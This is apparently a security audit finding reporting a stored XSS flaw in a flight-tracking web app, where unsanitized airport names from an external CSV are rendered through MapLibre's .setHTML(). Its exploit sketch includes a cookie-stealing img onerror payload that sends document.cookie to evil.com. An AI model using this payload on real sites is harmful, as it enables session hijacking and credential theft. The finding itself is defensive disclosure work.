---
Phase: 3
Sequence: 005
Slug: stored-xss-airport-name-maplibre
Verdict: VALID
Severity-Original: HIGH
Confidence: medium
Source-Drafts:
  - piolium/findings-draft/longshot-b1b2b937-001-maplibre-sethtml-xss.md
---

## Summary

Airport names are sourced from an external third-party CSV file (`ourairports-data` GitHub repository) fetched without integrity verification, stored in the database without sanitization, and then injected into raw HTML via MapLibre GL's `.setHTML()` method in the `FlightMap.svelte` component. A compromised upstream data source could inject XSS payloads into airport names, which would execute in users' browsers when they open the aircraft marker popup on a flight involving that airport.

## Affected Files

- `apps/weather-service/src/airports.ts:18-19` — fetches airports from external CSV without integrity check
- `apps/weather-service/src/airports.ts:86-90` — parses airport name from CSV without sanitization
- `apps/weather-service/src/airports.ts:116-119` — inserts airport data into database without sanitization
- `apps/web/src/routes/+layout.server.ts:29-36` — loads airport data into layout (no sanitization)
- `apps/web/src/lib/airports.ts:18-27` — `airportName()` returns unsanitized name from store
- `apps/web/src/lib/components/FlightMap.svelte:124-125` — `.setHTML()` injects airport name as raw HTML

## Root Cause

A chain of missing sanitization across multiple trust boundaries: external CSV data is ingested without integrity verification, stored without sanitization, and rendered as raw HTML via `.setHTML()` instead of the safe `.setText()` alternative. The `FlightMap.svelte` component correctly uses `.setText()` for airport marker popups (lines 103, 108) but uses `.setHTML()` for the aircraft marker popup (line 124), creating an inconsistent and vulnerable rendering path.

## Attacker Control

The attacker would need to compromise the upstream data source (`https://raw.githubusercontent.com/davidmegginson/ourairports-data/main/airports.csv`) — either by compromising the repository, performing MITM on the HTTPS fetch, or injecting malicious data through a pull request. The airport name field in the CSV is stored directly as `varchar(255)` with no sanitization.

## Impact

Stored XSS: arbitrary JavaScript execution in the airways.gg origin when a user opens the aircraft marker popup on any flight involving a compromised airport. This enables session hijacking, credential theft, DOM manipulation, and phishing.

## Evidence

**External CSV fetch — no integrity** (`apps/weather-service/src/airports.ts:18-19`):
```typescript
const OURAIRPORTS_URL = 'https://raw.githubusercontent.com/davidmegginson/ourairports-data/main/airports.csv';
const res = await fetch(OURAIRPORTS_URL);
```

**CSV parsing — raw name** (`apps/weather-service/src/airports.ts:86-90`):
```typescript
name: fields[nameIndex] || `${iata} Airport`,  // raw CSV, no sanitization
```

**airportName() returns unsanitized** (`apps/web/src/lib/airports.ts:18-27`):
```typescript
name = airport?.name ?? iata;  // unsanitized DB value
```

**Raw HTML injection** (`apps/web/src/lib/components/FlightMap.svelte:124-125`):
```typescript
.setPopup(new maplibregl.Popup().setHTML(
  `<b>${airportName(depAirport)} ...`
))
```

**Contrast — safe `.setText()` used elsewhere** (`FlightMap.svelte:103`):
```typescript
.setPopup(new maplibregl.Popup().setText(`${airportName(depAirport)} ...`))
```

## Exploit Sketch

1. Attacker compromises the `ourairports-data` repository or MITMs the fetch
2. Modifies an airport name (e.g., LHR) to: `<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>`
3. `weather-service` syncs the poisoned CSV into the database
4. Web app loads poisoned airport data via `+layout.server.ts`
5. User views a flight involving the compromised airport, clicks the aircraft marker popup
6. XSS payload executes in airways.gg origin

## Confidence Notes

MEDIUM confidence — the code path from CSV to `.setHTML()` is fully traced and the injection point is confirmed (`.setHTML()` with unsanitized string). However, the attack requires upstream data source compromise, which is a significant prerequisite. The `.setText()` alternative exists in the same component and would completely eliminate this risk. CSP headers were not verified and could provide partial mitigation.
